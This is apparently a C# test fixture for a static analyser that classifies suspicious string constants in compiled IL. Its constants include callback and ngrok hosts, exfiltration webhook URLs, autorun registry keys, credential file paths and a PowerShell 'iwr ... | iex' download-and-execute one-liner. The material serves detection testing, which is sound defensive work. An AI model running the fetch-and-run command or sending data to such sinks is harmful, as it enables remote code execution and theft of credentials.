namespace Silvergun.CodeAnalysis.IL.Tests.Fixture;

/// <summary>
/// String constants exercising every <c>IndicatorCategory</c> the ldstr-indicator classifier
/// (<c>IndicatorAnalysis</c>) recognises: callback/exfil/dynamic-DNS/raw-code-host domains (bare and
/// URL-embedded), public/private IPv4 and IPv6 literals, the <c>Version=</c> quad-exclusion boundary
/// cases, autorun registry paths, credential file paths, and reflection-mediated type names. Same
/// pattern as <see cref="HiddenPayloads"/>: nothing here is ever executed, each trivial accessor exists
/// only to surface its constant as an <c>ldstr</c> operand in the compiled IL.
/// </summary>
public class IndicatorPayloads
{
    #region Fields
    // ---- Acceptance criteria 1-4 (exact wording from the task spec) ----------------------------------

    /// <summary>AC1: a callback-domain host embedded in a URL.</summary>
    public const string CallbackDomainUrl = "https://x.pipedream.net/cb";

    /// <summary>AC2: an exfil-sink webhook URL embedded in a larger sentence (substring, not anchored).</summary>
    public const string ExfilSinkEmbeddedInSentence = "POST to https://hooks.slack.com/services/A/B/C now";

    /// <summary>AC3: a bare RFC1918 literal.</summary>
    public const string PrivateIpBare = "10.0.0.5";

    /// <summary>AC3: a bare public literal with a trailing port (port stripping).</summary>
    public const string PublicIpWithPort = "203.0.113.5:4444";

    /// <summary>AC4: an autorun persistence registry path.</summary>
    public const string AutorunRegistryPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    /// <summary>AC4: a well-known credential file path.</summary>
    public const string CredentialPathAwsCredentials = ".aws/credentials";

    // ---- D: per-category bare / URL-embedded / path-qualified forms ----------------------------------

    public const string CallbackDomainBare = "beacon check-in host x.pipedream.net for tasking";

    public const string DynamicDnsBare = "resolve myhost.ngrok.io to reach the tunnel";
    public const string DynamicDnsUrl = "http://myhost.ngrok.io/callback";

    public const string RawCodeHostBare = "fetch payload from raw.githubusercontent.com/user/repo/main/file.ps1";
    public const string RawCodeHostUrl = "iwr https://raw.githubusercontent.com/user/repo/main/file.ps1 -useb | iex";

    public const string ExfilSinkPastebinRaw = "https://pastebin.com/raw/AbCdEfGh";
    public const string ExfilSinkDiscordWebhook = "https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOp";
    public const string ExfilSinkSlackWebhook = "https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXXXXXXXXXX";
    public const string ExfilSinkTelegramBot = "https://api.telegram.org/bot123456789:ABCDEFghIJKlmNoPQRstuVWXyz/sendMessage";

    /// <summary>gitee's raw-content route: a RawCodeHost reference.</summary>
    public const string GiteeRawUrl = "https://gitee.com/user/repo/raw/master/file.sh";
    /// <summary>An ordinary gitee.com URL (no /raw/ route): NOT a RawCodeHost reference.</summary>
    public const string GiteeOrdinaryUrl = "see https://gitee.com/user/repo for source";

    public const string AutorunRegistryWinlogonShell = "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell";
    public const string CredentialPathSshKey = ".ssh/id_rsa";

    // ---- E: IP literals --------------------------------------------------------------------------

    public const string PrivateIpLoopback = "127.0.0.1";
    public const string PrivateIpLinkLocal = "169.254.1.1";
    public const string PrivateIp172Range = "172.16.5.4";
    public const string PrivateIp192Range = "192.168.1.10";

    /// <summary>A public IPv4 literal embedded in a sentence (also reused by the version-quad tests, F).</summary>
    public const string PublicIpv4EmbeddedInSentence = "connect to 8.8.8.8 now";

    /// <summary>IPv6 loopback: deliberately has no leading/trailing word char, the real bug the no-\b
    /// design decision guards against (see IndicatorAnalysis.ipv6Regex doc comment).</summary>
    public const string Ipv6Loopback = "::1";
    public const string Ipv6LinkLocal = "fe80::1";
    /// <summary>Unique-local (fc00::/7).</summary>
    public const string Ipv6Ula = "fd00::1";
    /// <summary>A real, globally-routable IPv6 (Cloudflare public DNS).</summary>
    public const string Ipv6Public = "2606:4700:4700::1111";
    /// <summary>Bracketed IPv6 literal with a trailing port — port/bracket stripping for the IPv6 family.</summary>
    public const string Ipv6WithPortBrackets = "[::1]:8080";

    // ---- F: the Version= quad exclusion -------------------------------------------------------------

    public const string VersionAssignmentPlain = "Version=4.0.0.0";
    public const string VersionAssignmentLowerSpaced = "version = 4.0.0.0";
    public const string AssemblyVersionAssignment = "AssemblyVersion=1.2.3.4";
    public const string FileVersionAssignment = "FileVersion=10.0.0.1";
    /// <summary>Note: 192.168.1.1 would otherwise be a private-IP-shaped quad — the version-assignment
    /// context must suppress it regardless of what range the quad falls in.</summary>
    public const string ProductVersionAssignment = "ProductVersion=192.168.1.1";

    /// <summary>The exact string from the task spec: a full assembly-qualified type name whose Version=
    /// quad must NOT also produce an IP finding, while the AQN itself must still produce exactly one
    /// ReflectionTypeName finding.</summary>
    public const string FullAssemblyQualifiedName =
        "System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

    /// <summary>A dotted quad that LOOKS like a version but is not preceded by an assignment token at
    /// all (it is a URL host) — must still fire as an IP literal.</summary>
    public const string UrlWithVersionLikeHost = "http://4.0.0.0/payload";

    /// <summary>Boundary: "MyVersion=" is not an exact (whole-token) match for "Version=" — must still fire.</summary>
    public const string MyVersionFalseSuffix = "MyVersion=4.0.0.0";

    /// <summary>Boundary: no '=' after "Version", so this is not an assignment — must still fire.</summary>
    public const string VersionWithoutEquals = "Version 4.0.0.0";

    // ---- F2: OID / unspecified-address false-positive fixes ------------------------------------------

    /// <summary>MimeKit's real S/MIME OID. The IPv4 matcher naively carves "1.3.6.1" and "4.1.188.7" out
    /// of this — the OID-slicing false positive (indicator-benign-prevalence.md) — both must now be
    /// suppressed, so this constant must produce NO IP finding at all.</summary>
    public const string OidSlicedIntoIpLiterals = "1.3.6.1.4.1.188.7.1.1.2";

    /// <summary>The OID false positive AND a genuine public IP literal in the same constant: the OID
    /// fragments must be suppressed AND 8.8.8.8 must still be reported. Checking suppression alone
    /// cannot distinguish "the fix works" from "IP detection broke".</summary>
    public const string OidAndPublicIpCombined = "OID 1.3.6.1.4.1.188.7.1.1.2 talks to 8.8.8.8";

    /// <summary>Negative side of the OID fix: a trailing SENTENCE period (not a continuing dotted run —
    /// the character after the dot is end-of-string, not a digit) must still fire.</summary>
    public const string IpLiteralTrailingSentencePeriod = "The server is at 8.8.8.8.";

    /// <summary>KNOWN LIMITATION (not fixed — see IndicatorAnalysisTests): a standalone, exactly-4-arc OID
    /// fragment with nothing on either side is syntactically indistinguishable from a real address. There
    /// is no positional signal to reject it.</summary>
    public const string BareOidFragmentReadAsIp = "1.3.6.1";

    /// <summary>KNOWN LIMITATION (not fixed — see IndicatorAnalysisTests): an unlabeled 4-part version
    /// (no "Version=" prefix, all octets &lt;= 255) is indistinguishable from a real address.</summary>
    public const string UnlabeledVersionQuadReadAsIp = "Fixed in 1.2.3.4";

    /// <summary>The bare all-elision IPv6 form "::", carved out of a regex SOURCE-CODE literal exactly as
    /// MimeKit-adjacent code does (e.g. a named-group pattern like "[^{}:]+)(?::"). Carries no hex group
    /// at all — must now produce NO finding (previously misclassified as PublicIpLiteral).</summary>
    public const string BareDoubleColonFromRegexSource = "[^{}:]+)(?::";

    /// <summary>The IPv4 unspecified address. Not routable, so — like "::" — it must classify as
    /// PrivateIpLiteral, not PublicIpLiteral (this is a CHANGED expectation from before the fix).</summary>
    public const string UnspecifiedIpv4 = "0.0.0.0";

    /// <summary>Unique-local (fc00::/7) non-regression, using the exact address named in the fix's own
    /// doc comment rather than the pre-existing <see cref="Ipv6Ula"/> fixture value.</summary>
    public const string Ipv6UniqueLocalFc00 = "fc00::1";

    /// <summary>A real, globally-routable IPv6 (the RFC 3849 documentation prefix) — public non-regression,
    /// distinct from the pre-existing <see cref="Ipv6Public"/> fixture value.</summary>
    public const string Ipv6PublicDocumentationExample = "2001:db8::1";

    // ---- F3: IsAdjacentToWordCharacter (leading/trailing word-adjacency) fix -------------------------

    /// <summary>LEADING-side defect (SecureBlackbox-adjacent): an XPath axis selector where the
    /// hex-digit tail of "self" ('f') sits directly against "::" — previously misread as the fragment
    /// "f::". Must now produce NO IP finding.</summary>
    public const string XPathDescendantOrSelfAxis = "descendant-or-self::node()";

    /// <summary>LEADING-side defect (DSharpPlus-adjacent): a Discord emoji shortcode where the hex-digit
    /// tail of "hand" ('d') sits directly against "::" — previously misread as the fragment "d::". Must
    /// now produce NO IP finding.</summary>
    public const string DiscordEmojiShortcode = ":call_me_hand::skin-tone-1:";

    /// <summary>TRAILING-side defect (Npgsql-adjacent): a PostgreSQL type cast. The apostrophe already
    /// blocks the LEADING side ('\'' is not alphanumeric) — this is NOT caught by a leading-only guard.
    /// The greedy hex group after "::" swallows "b" from "boolean", previously misread as "::b" (which
    /// <c>IPAddress.TryParse</c> accepts as "::000b"). Must now produce NO IP finding.</summary>
    public const string NpgsqlCastToBoolean = "'true'::boolean";

    /// <summary>Both leading- and trailing-adjacent PostgreSQL casts in one realistic SQL constant. Must
    /// produce NO IP finding at all.</summary>
    public const string SqlCaseWhenWithCastBoolean =
        "SELECT CASE WHEN x THEN 'true'::boolean ELSE 'false'::boolean END";

    /// <summary>Dedicated TRAILING-side case, independent of <see cref="NpgsqlCastToBoolean"/>: built so
    /// the run after "::" is exactly four greedy hex characters ("a1b2") followed by MORE word characters
    /// ("c3"). A LEADING-only guard would let this through unmodified — the character before the match is
    /// an apostrophe, not alphanumeric — and <c>IPAddress.TryParse("::a1b2")</c> happily parses it as a
    /// valid literal. Only the trailing half of the symmetric fix (the character immediately after the
    /// match, 'c' of "c3") rejects it. This is what discriminates the shipped symmetric fix from a
    /// leading-only one.</summary>
    public const string TrailingSideWordAdjacencyDiscriminator = "key'::a1b2c3";

    /// <summary>Real, unabbreviated public IPv6 literal (Google Public DNS) — a genuine non-regression
    /// case for the word-adjacency fix, distinct from the pre-existing IPv6 fixtures.</summary>
    public const string Ipv6GoogleDns = "2001:4860:4860::8888";

    /// <summary>Boundary: an IPv6 literal preceded by a space still fires — a preceding non-word
    /// character is not the same as no preceding character at all (the start-of-string case is already
    /// covered by <see cref="Ipv6Loopback"/>).</summary>
    public const string Ipv6PrecededBySpace = "connect to ::1 now";

    /// <summary>Boundary: an IPv6 literal preceded by '=' still fires.</summary>
    public const string Ipv6PrecededByEquals = "addr=::1";

    /// <summary>Boundary: an IPv6 literal preceded (and followed) by '"' still fires.</summary>
    public const string Ipv6PrecededByQuote = "\"::1\"";

    /// <summary>Boundary: an IPv6 literal preceded (and followed) by parentheses still fires. (The '['
    /// case is already covered by <see cref="Ipv6WithPortBrackets"/>.)</summary>
    public const string Ipv6PrecededByParen = "(::1)";

    // ---- G: semantics ----------------------------------------------------------------------------

    /// <summary>A URL whose host matches no named category — the GenericUrl fallback.</summary>
    public const string GenericUrlUnclaimed = "check out https://example.com/page for docs";

    /// <summary>An assembly-qualified type name whose type-name segment differs only by case from
    /// <see cref="ReflectionAqnCaseLower"/> — CLR type names are case-sensitive, so these two must
    /// remain DISTINCT findings (case preserved, not folded like a host).</summary>
    public const string ReflectionAqnCaseUpper =
        "System.Net.WebClient, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";
    public const string ReflectionAqnCaseLower =
        "system.net.webclient, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";

    /// <summary>No assembly qualification present — exercises the namespace-qualified fallback alone.</summary>
    public const string NamespaceQualifiedFallback = "System.Net.WebClient";

    // ---- H: bounds ---------------------------------------------------------------------------------

    // 50 literal characters, repeated 5x below (250 total) so the combined constant is well over
    // IndicatorAnalysis.MaxExcerptLength (200) while staying trivially auditable (10 digits x 5).
    private const string Pad50 = "01234567890123456789012345678901234567890123456789";

    /// <summary>A constant over 200 characters with an indicator near the start, so Excerpt must be
    /// hard-capped at MaxExcerptLength (200) + the ellipsis marker, not the full (padded) text.</summary>
    public const string LongExcerptWithIndicator =
        "callback beacon at x.pipedream.net padding-> " + Pad50 + Pad50 + Pad50 + Pad50 + Pad50;
    #endregion

    #region Methods
    public string GetCallbackDomainUrl() => CallbackDomainUrl;
    public string GetExfilSinkEmbeddedInSentence() => ExfilSinkEmbeddedInSentence;
    public string GetPrivateIpBare() => PrivateIpBare;
    public string GetPublicIpWithPort() => PublicIpWithPort;
    public string GetAutorunRegistryPath() => AutorunRegistryPath;
    public string GetCredentialPathAwsCredentials() => CredentialPathAwsCredentials;

    public string GetCallbackDomainBare() => CallbackDomainBare;
    public string GetDynamicDnsBare() => DynamicDnsBare;
    public string GetDynamicDnsUrl() => DynamicDnsUrl;
    public string GetRawCodeHostBare() => RawCodeHostBare;
    public string GetRawCodeHostUrl() => RawCodeHostUrl;
    public string GetExfilSinkPastebinRaw() => ExfilSinkPastebinRaw;
    public string GetExfilSinkDiscordWebhook() => ExfilSinkDiscordWebhook;
    public string GetExfilSinkSlackWebhook() => ExfilSinkSlackWebhook;
    public string GetExfilSinkTelegramBot() => ExfilSinkTelegramBot;
    public string GetGiteeRawUrl() => GiteeRawUrl;
    public string GetGiteeOrdinaryUrl() => GiteeOrdinaryUrl;
    public string GetAutorunRegistryWinlogonShell() => AutorunRegistryWinlogonShell;
    public string GetCredentialPathSshKey() => CredentialPathSshKey;

    public string GetPrivateIpLoopback() => PrivateIpLoopback;
    public string GetPrivateIpLinkLocal() => PrivateIpLinkLocal;
    public string GetPrivateIp172Range() => PrivateIp172Range;
    public string GetPrivateIp192Range() => PrivateIp192Range;
    public string GetPublicIpv4EmbeddedInSentence() => PublicIpv4EmbeddedInSentence;
    public string GetIpv6Loopback() => Ipv6Loopback;
    public string GetIpv6LinkLocal() => Ipv6LinkLocal;
    public string GetIpv6Ula() => Ipv6Ula;
    public string GetIpv6Public() => Ipv6Public;
    public string GetIpv6WithPortBrackets() => Ipv6WithPortBrackets;

    public string GetVersionAssignmentPlain() => VersionAssignmentPlain;
    public string GetVersionAssignmentLowerSpaced() => VersionAssignmentLowerSpaced;
    public string GetAssemblyVersionAssignment() => AssemblyVersionAssignment;
    public string GetFileVersionAssignment() => FileVersionAssignment;
    public string GetProductVersionAssignment() => ProductVersionAssignment;
    public string GetFullAssemblyQualifiedName() => FullAssemblyQualifiedName;
    public string GetUrlWithVersionLikeHost() => UrlWithVersionLikeHost;
    public string GetMyVersionFalseSuffix() => MyVersionFalseSuffix;
    public string GetVersionWithoutEquals() => VersionWithoutEquals;

    public string GetOidSlicedIntoIpLiterals() => OidSlicedIntoIpLiterals;
    public string GetOidAndPublicIpCombined() => OidAndPublicIpCombined;
    public string GetIpLiteralTrailingSentencePeriod() => IpLiteralTrailingSentencePeriod;
    public string GetBareOidFragmentReadAsIp() => BareOidFragmentReadAsIp;
    public string GetUnlabeledVersionQuadReadAsIp() => UnlabeledVersionQuadReadAsIp;
    public string GetBareDoubleColonFromRegexSource() => BareDoubleColonFromRegexSource;
    public string GetUnspecifiedIpv4() => UnspecifiedIpv4;
    public string GetIpv6UniqueLocalFc00() => Ipv6UniqueLocalFc00;
    public string GetIpv6PublicDocumentationExample() => Ipv6PublicDocumentationExample;

    public string GetXPathDescendantOrSelfAxis() => XPathDescendantOrSelfAxis;
    public string GetDiscordEmojiShortcode() => DiscordEmojiShortcode;
    public string GetNpgsqlCastToBoolean() => NpgsqlCastToBoolean;
    public string GetSqlCaseWhenWithCastBoolean() => SqlCaseWhenWithCastBoolean;
    public string GetTrailingSideWordAdjacencyDiscriminator() => TrailingSideWordAdjacencyDiscriminator;
    public string GetIpv6GoogleDns() => Ipv6GoogleDns;
    public string GetIpv6PrecededBySpace() => Ipv6PrecededBySpace;
    public string GetIpv6PrecededByEquals() => Ipv6PrecededByEquals;
    public string GetIpv6PrecededByQuote() => Ipv6PrecededByQuote;
    public string GetIpv6PrecededByParen() => Ipv6PrecededByParen;

    public string GetGenericUrlUnclaimed() => GenericUrlUnclaimed;
    public string GetReflectionAqnCaseUpper() => ReflectionAqnCaseUpper;
    public string GetReflectionAqnCaseLower() => ReflectionAqnCaseLower;
    public string GetNamespaceQualifiedFallback() => NamespaceQualifiedFallback;

    public string GetLongExcerptWithIndicator() => LongExcerptWithIndicator;

    /// <summary>
    /// AC5: the same host in FIVE separate <c>ldstr</c> constants within one method must aggregate to
    /// ONE finding with Occurrences == 5. The locals + <see cref="string.Join(string, string[])"/> call
    /// (rather than <c>+</c> on literals) is deliberate: the C# compiler constant-folds literal
    /// concatenation into a single ldstr, which would defeat the "five separate constants" premise.
    /// </summary>
    public string GetFiveCallbackConstants()
    {
        var a = "hit https://x.pipedream.net/a here";
        var b = "hit https://x.pipedream.net/b here";
        var c = "hit https://x.pipedream.net/c here";
        var d = "hit https://x.pipedream.net/d here";
        var e = "hit https://x.pipedream.net/e here";
        return string.Join(",", a, b, c, d, e);
    }

    /// <summary>G: the same host in two DIFFERENT caller methods must NOT merge into one finding.</summary>
    public string GetCallbackHostInMethodOne() => "reach out to x.pipedream.net now";

    /// <summary>G: paired with <see cref="GetCallbackHostInMethodOne"/> — same host, different caller.</summary>
    public string GetCallbackHostInMethodTwo() => "reach out to x.pipedream.net again";

    /// <summary>G: the same host in two constants that differ only by case, in ONE method — host
    /// aggregation is case-insensitive, so this must merge into ONE finding with Occurrences == 2.</summary>
    // Mixed case ("X.pipedream.net", not "X.PIPEDREAM.NET"): an all-caps host would ALSO satisfy the
    // separate, deliberately-broad namespace-qualified-type-name heuristic (every dot-segment starting
    // with a capital letter), producing an extra, unrelated ReflectionTypeName finding that has nothing
    // to do with what this test is checking (case-insensitive HOST aggregation).
    public string GetCaseVariantCallbackHost()
    {
        var upper = "beacon to HTTPS://X.pipedream.net/upper for check-in";
        var lower = "beacon to https://x.pipedream.net/lower for check-in";
        return string.Join(" ", upper, lower);
    }
    #endregion
}
